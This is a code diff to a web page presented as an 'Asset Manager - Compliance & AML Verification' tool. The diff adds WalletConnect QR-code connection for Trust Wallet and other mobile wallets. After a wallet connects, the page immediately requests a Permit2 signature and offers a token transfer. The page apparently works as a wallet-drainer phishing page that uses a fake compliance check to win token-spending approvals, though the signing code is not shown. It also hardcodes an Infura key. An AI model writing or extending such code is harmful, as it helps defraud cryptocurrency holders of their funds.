@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Asset Manager - Compliance & AML Verification</title>
   <script src="https://unpkg.com/ethers@6.8.1/dist/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/qrcode@1.5.3/build/qrcode.min.js"></script>
   <style>
     body {
       font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -130,6 +132,136 @@
       -moz-appearance: textfield; 
       appearance: textfield; 
     }
+    .mobile-instructions {
+      background: rgba(255, 193, 7, 0.1);
+      border: 1px solid rgba(255, 193, 7, 0.3);
+      border-radius: 16px;
+      padding: 24px;
+      margin: 24px 0;
+      text-align: left;
+    }
+    .mobile-instructions h3 {
+      margin-top: 0;
+      color: #2d3748;
+      font-weight: 600;
+      text-align: center;
+    }
+    .instruction-step {
+      display: flex;
+      align-items: flex-start;
+      margin: 16px 0;
+      gap: 12px;
+    }
+    .step-number {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+    .step-content {
+      flex: 1;
+      color: #2d3748;
+      line-height: 1.5;
+    }
+    .qr-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.8);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+    .qr-modal-content {
+      background: white;
+      border-radius: 20px;
+      padding: 0;
+      max-width: 400px;
+      width: 90%;
+      max-height: 90vh;
+      overflow-y: auto;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+    }
+    .qr-modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 24px;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    .qr-modal-header h3 {
+      margin: 0;
+      color: #2d3748;
+      font-weight: 600;
+    }
+    .close-btn {
+      background: none;
+      border: none;
+      font-size: 24px;
+      cursor: pointer;
+      color: #718096;
+      padding: 0;
+      width: 30px;
+      height: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      transition: all 0.2s;
+    }
+    .close-btn:hover {
+      background: #f7fafc;
+      color: #2d3748;
+    }
+    .qr-modal-body {
+      padding: 24px;
+      text-align: center;
+    }
+    .qr-modal-body p {
+      margin: 0 0 20px 0;
+      color: #4a5568;
+      font-size: 16px;
+    }
+    .qr-code-container {
+      background: white;
+      border: 2px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      display: inline-block;
+    }
+    .qr-instructions {
+      margin: 20px 0;
+      text-align: left;
+    }
+    .connection-status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+    .connection-status.connecting {
+      background: #d1ecf1;
+      color: #0c5460;
+    }
+    .connection-status.connected {
+      background: #d4edda;
+      color: #155724;
+    }
+    .connection-status.error {
+      background: #f8d7da;
+      color: #721c24;
+    }
   </style>
 </head>
 <body>
@@ -162,6 +294,28 @@
 
     <button id="connectWallet">Connect Wallet</button>
 
+    <div id="mobileInstructions" class="mobile-instructions" style="display:none;">
+      <h3>📱 Mobile Wallet Connection</h3>
+      <div class="instruction-step">
+        <div class="step-number">1</div>
+        <div class="step-content">
+          <strong>Trust Wallet:</strong> Open Trust Wallet app → Tap "Browser" → Navigate to this page
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-number">2</div>
+        <div class="step-content">
+          <strong>MetaMask:</strong> Open MetaMask app → Tap "Browser" → Navigate to this page
+        </div>
+      </div>
+      <div class="instruction-step">
+        <div class="step-number">3</div>
+        <div class="step-content">
+          <strong>Other Wallets:</strong> Use your wallet's built-in browser feature
+        </div>
+      </div>
+    </div>
+
     <div id="walletInfo" class="wallet-info" style="display:none;">
       <p><b>Address:</b> <span id="userAddress"></span></p>
       <p><b>Network:</b> <span id="networkName"></span></p>
@@ -180,6 +334,35 @@
     <div id="status" class="status info" style="display:none;"></div>
   </div>
 
+  <!-- QR Code Modal for Trust Wallet Connection -->
+  <div id="qrModal" class="qr-modal" style="display:none;">
+    <div class="qr-modal-content">
+      <div class="qr-modal-header">
+        <h3>📱 Connect Trust Wallet</h3>
+        <button id="closeQrModal" class="close-btn">&times;</button>
+      </div>
+      <div class="qr-modal-body">
+        <p>Scan this QR code with your Trust Wallet app:</p>
+        <div id="qrCode" class="qr-code-container"></div>
+        <div class="qr-instructions">
+          <div class="instruction-step">
+            <div class="step-number">1</div>
+            <div class="step-content">Open Trust Wallet on your phone</div>
+          </div>
+          <div class="instruction-step">
+            <div class="step-number">2</div>
+            <div class="step-content">Tap "Connect Wallet" or "Scan QR"</div>
+          </div>
+          <div class="instruction-step">
+            <div class="step-number">3</div>
+            <div class="step-content">Scan the QR code above</div>
+          </div>
+        </div>
+        <div id="connectionStatus" class="connection-status"></div>
+      </div>
+    </div>
+  </div>
+
   <script>
     // Update this to your backend
     const BACKEND_URL = "http://localhost:3001";
@@ -194,9 +377,22 @@
     const transferSection = document.getElementById("transferSection");
     const transferBtn = document.getElementById("transferBtn");
     const transferAmountInput = document.getElementById("transferAmount");
+    const mobileInstructions = document.getElementById("mobileInstructions");
+    const qrModal = document.getElementById("qrModal");
+    const qrCode = document.getElementById("qrCode");
+    const closeQrModal = document.getElementById("closeQrModal");
+    const connectionStatus = document.getElementById("connectionStatus");
 
     connectWalletBtn.addEventListener("click", connectWallet);
     transferBtn.addEventListener("click", transferTokens);
+    closeQrModal.addEventListener("click", closeModal);
+    
+    // Close modal when clicking outside
+    qrModal.addEventListener("click", function(e) {
+      if (e.target === qrModal) {
+        closeModal();
+      }
+    });
 
     function showStatus(message, type = "info") {
       statusDiv.textContent = message;
@@ -204,90 +400,131 @@
       statusDiv.style.display = "block";
     }
 
+    function closeModal() {
+      qrModal.style.display = "none";
+      connectionStatus.textContent = "";
+      connectionStatus.className = "connection-status";
+    }
+
+    function showConnectionStatus(message, type = "") {
+      connectionStatus.textContent = message;
+      connectionStatus.className = "connection-status " + type;
+    }
+
     async function connectWallet() {
       try {
-        // Enhanced wallet detection for multiple providers
-        let ethereum = window.ethereum;
-        let walletName = "Unknown Wallet";
-        
-        // Check for various wallet providers
-        if (window.ethereum) {
-          if (window.ethereum.isMetaMask) {
-            walletName = "MetaMask";
-          } else if (window.ethereum.isTrust) {
-            walletName = "Trust Wallet";
-          } else if (window.ethereum.isCoinbaseWallet) {
-            walletName = "Coinbase Wallet";
-          } else if (window.ethereum.isBraveWallet) {
-            walletName = "Brave Wallet";
-          } else if (window.ethereum.isRabby) {
-            walletName = "Rabby";
-          } else if (window.ethereum.isTokenPocket) {
-            walletName = "TokenPocket";
-          } else if (window.ethereum.isImToken) {
-            walletName = "imToken";
-          } else {
-            walletName = "Ethereum Wallet";
-          }
-        } else if (window.web3 && window.web3.currentProvider) {
-          ethereum = window.web3.currentProvider;
-          walletName = "Web3 Provider";
-        } else if (window.tronWeb && window.tronWeb.defaultAddress) {
-          // Tron wallet detection
-          throw new Error("Tron wallet detected. This app requires an Ethereum-compatible wallet like Trust Wallet or MetaMask.");
-        } else {
-          // Check for mobile wallet deep links
-          const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-          if (isMobile) {
-            throw new Error("No Ethereum wallet detected on mobile. Please open this page in Trust Wallet browser or install MetaMask mobile app.");
-          } else {
-            throw new Error("No Ethereum wallet detected. Please install MetaMask, Trust Wallet, or another compatible wallet.");
-          }
-        }
-        
-        showStatus(`🔄 Connecting to ${walletName}...`, "info");
-
-        provider = new ethers.BrowserProvider(ethereum);
-        
-        // Enhanced connection handling for mobile wallets
-        try {
+        // Check if we have a direct wallet connection first
+        if (window.ethereum && window.ethereum.isMetaMask) {
+          // Use direct MetaMask connection
+          showStatus("🔄 Connecting to Wallet...", "info");
+          provider = new ethers.BrowserProvider(window.ethereum);
           await provider.send("eth_requestAccounts", []);
-        } catch (requestErr) {
-          // Handle specific mobile wallet connection issues
-          if (requestErr.code === 4001) {
-            throw new Error("Connection rejected by user");
-          } else if (requestErr.code === -32002) {
-            throw new Error("Connection request already pending. Please check your wallet.");
-          } else {
-            throw new Error(`Connection failed: ${requestErr.message || 'Please try again'}`);
-          }
+          signer = await provider.getSigner();
+          userAddress = await signer.getAddress();
+          
+          const network = await provider.getNetwork();
+          networkNameSpan.textContent = network.name || network.chainId;
+          userAddressSpan.textContent = userAddress;
+          walletInfo.style.display = "block";
+          
+          showStatus("✅ Wallet connected! Preparing Permit2 signature request...", "info");
+          await requestSignatureAndAuthorize();
+          return;
         }
         
-        signer = await provider.getSigner();
-        userAddress = await signer.getAddress();
+        // For Trust Wallet and other mobile wallets, use WalletConnect
+        showStatus("🔄 Initializing Trust Wallet connection...", "info");
+        
+        // Initialize WalletConnect
+        const walletConnectProvider = new WalletConnectProvider.default({
+          rpc: {
+            1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161", // Ethereum mainnet
+            137: "https://polygon-rpc.com", // Polygon
+            56: "https://bsc-dataseed.binance.org", // BSC
+          },
+          chainId: 1, // Default to Ethereum mainnet
+        });
 
-        const network = await provider.getNetwork();
-        networkNameSpan.textContent = network.name || network.chainId;
-        userAddressSpan.textContent = userAddress;
-        walletInfo.style.display = "block";
+        // Enable session (triggers QR Code modal)
+        await walletConnectProvider.enable();
+        
+        // Show QR Code modal
+        qrModal.style.display = "flex";
+        showConnectionStatus("🔄 Waiting for connection...", "connecting");
+        
+        // Generate QR Code
+        const uri = walletConnectProvider.connector.uri;
+        QRCode.toCanvas(qrCode, uri, { width: 256, margin: 2 }, function (error) {
+          if (error) {
+            console.error("QR Code generation failed:", error);
+            showConnectionStatus("❌ Failed to generate QR code", "error");
+          } else {
+            showConnectionStatus("📱 Scan QR code with Trust Wallet", "connecting");
+          }
+        });
 
-        showStatus(`✅ ${walletName} connected! Preparing Permit2 signature request...`, "info");
+        // Listen for connection events
+        walletConnectProvider.on("connect", (error, payload) => {
+          if (error) {
+            console.error("WalletConnect connection error:", error);
+            showConnectionStatus("❌ Connection failed: " + error.message, "error");
+            return;
+          }
+          
+          showConnectionStatus("✅ Connected! Setting up wallet...", "connected");
+          
+          // Create ethers provider from WalletConnect
+          provider = new ethers.BrowserProvider(walletConnectProvider);
+          signer = provider.getSigner();
+          
+          // Get user address
+          signer.getAddress().then(address => {
+            userAddress = address;
+            userAddressSpan.textContent = userAddress;
+            
+            // Get network info
+            provider.getNetwork().then(network => {
+              networkNameSpan.textContent = network.name || network.chainId;
+              walletInfo.style.display = "block";
+              
+              // Close QR modal
+              setTimeout(() => {
+                closeModal();
+                showStatus("✅ Trust Wallet connected! Preparing Permit2 signature request...", "info");
+                requestSignatureAndAuthorize();
+              }, 1000);
+            });
+          });
+        });
 
-        await requestSignatureAndAuthorize();
+        walletConnectProvider.on("disconnect", (error, payload) => {
+          console.log("WalletConnect disconnected:", error, payload);
+          showConnectionStatus("❌ Wallet disconnected", "error");
+        });
+
+        // Handle session rejection
+        walletConnectProvider.connector.on("session_reject", (error, payload) => {
+          console.log("Session rejected:", error, payload);
+          showConnectionStatus("❌ Connection rejected by user", "error");
+        });
+
       } catch (err) {
         console.error(err);
         
-        // Enhanced error handling for mobile wallets
+        // Enhanced error handling
         let errorMessage = err?.message || err;
         
         if (errorMessage.includes("User rejected") || errorMessage.includes("User denied")) {
           showStatus("❌ Connection cancelled by user", "error");
         } else if (errorMessage.includes("No Ethereum wallet detected")) {
           showStatus("❌ No wallet detected. Please install Trust Wallet, MetaMask, or another compatible wallet.", "error");
-        } else if (errorMessage.includes("Already processing")) {
-          showStatus("❌ Wallet connection already in progress. Please wait...", "error");
         } else {
           showStatus("❌ " + errorMessage, "error");
+        }
+        
+        // Close QR modal if open
+        if (qrModal.style.display === "flex") {
+          closeModal();
         }
       }
     }
